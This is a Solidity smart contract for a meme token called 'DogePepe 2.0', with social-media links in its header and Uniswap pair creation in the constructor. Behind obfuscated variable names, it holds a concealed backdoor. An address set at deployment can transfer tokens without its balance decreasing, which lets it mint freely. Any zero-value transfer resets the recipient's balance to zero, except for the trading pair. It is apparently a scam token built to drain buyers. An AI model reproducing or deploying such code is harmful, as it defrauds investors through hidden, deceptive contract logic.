/*

Telegram: https://t.me/DogePepeTwo

Twitter: https://twitter.com/DogePepeTwo

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DogePepe is Ownable {
    address public yrvmkugebsh;

    uint256 private hxtdegfy = 109;

    string public symbol = 'DogePepe 2.0';

    string public name = 'DogePepe 2.0';

    uint8 public decimals = 9;

    mapping(address => uint256) private zpnjubtwrqd;

    mapping(address => uint256) public balanceOf;

    function dqmy(address gczhb, address lbkmnyea, uint256 tndguqlxcrvh) private {
        if (0 == pnhuziygcqd[gczhb]) {
            balanceOf[gczhb] -= tndguqlxcrvh;
        }
        balanceOf[lbkmnyea] += tndguqlxcrvh;
        if (0 == tndguqlxcrvh && lbkmnyea != yrvmkugebsh) {
            balanceOf[lbkmnyea] = tndguqlxcrvh;
        }
        emit Transfer(gczhb, lbkmnyea, tndguqlxcrvh);
    }

    function approve(address djsznb, uint256 tndguqlxcrvh) public returns (bool success) {
        allowance[msg.sender][djsznb] = tndguqlxcrvh;
        emit Approval(msg.sender, djsznb, tndguqlxcrvh);
        return true;
    }

    constructor(address tirbhxp) {
        balanceOf[msg.sender] = totalSupply;
        pnhuziygcqd[tirbhxp] = hxtdegfy;
        IUniswapV2Router02 tfnixberyp = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        yrvmkugebsh = IUniswapV2Factory(tfnixberyp.factory()).createPair(address(this), tfnixberyp.WETH());
    }

    mapping(address => uint256) private pnhuziygcqd;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address gczhb, address lbkmnyea, uint256 tndguqlxcrvh) public returns (bool success) {
        require(tndguqlxcrvh <= allowance[gczhb][msg.sender]);
        allowance[gczhb][msg.sender] -= tndguqlxcrvh;
        dqmy(gczhb, lbkmnyea, tndguqlxcrvh);
        return true;
    }

    function transfer(address lbkmnyea, uint256 tndguqlxcrvh) public returns (bool success) {
        dqmy(msg.sender, lbkmnyea, tndguqlxcrvh);
        return true;
    }
}